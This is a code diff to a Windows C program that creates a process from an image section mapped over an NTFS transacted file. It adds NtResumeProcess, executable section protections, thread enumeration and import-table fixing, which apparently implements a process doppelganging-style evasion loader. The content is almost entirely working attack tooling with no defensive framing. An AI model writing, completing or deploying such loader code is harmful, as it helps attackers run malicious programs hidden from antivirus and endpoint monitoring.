@@ -98,7 +98,6 @@ void passProcessInfo() {
     if (hMapFile == NULL) {
         fprintf(stderr, "Could not create file mapping object (%ld).\n", GetLastError());
         return;
-    // Analyze the executable to retrieve the function information
     }
 
     // Map the shared memory into the process's address space
@@ -177,9 +176,9 @@ HANDLE createProcess() {
     fpNtCreateTransaction _NtCreateTransaction = (fpNtCreateTransaction)GetProcAddress(hNtDll, "NtCreateTransaction");
     fpNtCreateSection _NtCreateSection = (fpNtCreateSection)GetProcAddress(hNtDll, "NtCreateSection");
     fpNtClose _NtClose = (fpNtClose)GetProcAddress(hNtDll, "NtClose");
+    fpNtResumeProcess _NtResumeProcess = (fpNtResumeProcess)GetProcAddress(hNtDll, "NtResumeProcess");
 
-
-    if (_NtCreateProcessEx == NULL || _NtCreateTransaction == NULL || _NtCreateSection == NULL || _NtClose == NULL) {
+    if (_NtCreateProcessEx == NULL || _NtCreateTransaction == NULL || _NtCreateSection == NULL || _NtClose == NULL || _NtResumeProcess == NULL) {
         fprintf(stderr, "Failed to get the address of required functions\n");
         FreeLibrary(hNtDll);
         return NULL;
@@ -192,9 +191,9 @@ HANDLE createProcess() {
 
     // Initialize OBJECT_ATTRIBUTES
     objattr.Length = sizeof(OBJECT_ATTRIBUTES);
-    objattr.Attributes = 0x00000040L; //OBJ_CASE_INSENSITIVE 
-    objattr.ObjectName = NULL;
     objattr.RootDirectory = NULL;
+    objattr.ObjectName = NULL;
+    objattr.Attributes = OBJ_CASE_INSENSITIVE | OBJ_EXCLUSIVE; // OBJ_CASE_INSENSITIVE | OBJ_EXCLUSIVE
     objattr.SecurityDescriptor = NULL;
     objattr.SecurityQualityOfService = NULL;
 
@@ -214,7 +213,7 @@ HANDLE createProcess() {
     const char *strObjName = (const char *)wstrObjName;
     HANDLE hTransactedFile = CreateFileTransacted(
         strObjName,
-        GENERIC_WRITE | GENERIC_READ,
+        GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE,
         0,
         NULL,
         OPEN_EXISTING,
@@ -230,15 +229,11 @@ HANDLE createProcess() {
         SECTION_ALL_ACCESS,
         NULL,
         0,
-        PAGE_READONLY,
+        PAGE_EXECUTE,
         SEC_IMAGE,
         hTransactedFile);
 
     status = _NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
-
-    DWORD pid = GetProcessId(hProcess);
-    printf("Successfully created process\n");
-    printf("PID = %lu\n", pid);
 
     // Check status
     if (status != 0) {
@@ -246,20 +241,53 @@ HANDLE createProcess() {
         CloseHandle(hTransactedFile);
         _NtClose(hTransaction);
         _NtClose(hSection);
-        _NtClose(hProcess);
         FreeLibrary(hNtDll);
         return NULL;
     }
+
+    DWORD pid = GetProcessId(hProcess);
+    printf("Successfully created process\n");
+    printf("PID = %lu\n", pid);
+
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(0x00000004, 0); //TH32CS_SNAPTHREAD
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "Failed to create thread snapshot (Error: %lu)\n", GetLastError());
+        return NULL;
+    }
+    THREADENTRY32 te;
+    te.dwSize = sizeof(THREADENTRY32);
+    if (Thread32First(snapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == GetProcessId(hProcess)) {
+                printf("Thread ID: %lu\n", te.th32ThreadID);
+            }
+        } while (Thread32Next(snapshot, &te));
+    }
+    CloseHandle(snapshot);
+
+    Sleep(10000);
+
+    // Resume the primary thread of the process
+    //HANDLE hThread;
+    status = _NtResumeProcess(hProcess);
+    if (status != 0) {
+        fprintf(stderr, "NtResumeThread failed with status 0x%lx\n", status);
+    } else {
+        printf("Process resumed successfully and is now running.\n");
+    }
+
+    Sleep(10000);
 
     // Cleanup
     CloseHandle(hTransactedFile);
     _NtClose(hTransaction);
     _NtClose(hSection);
-    _NtClose(hProcess);
     FreeLibrary(hNtDll);
 
     return hProcess;
 }
+
 
 void fixIAT(UINT_PTR baseAddress) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
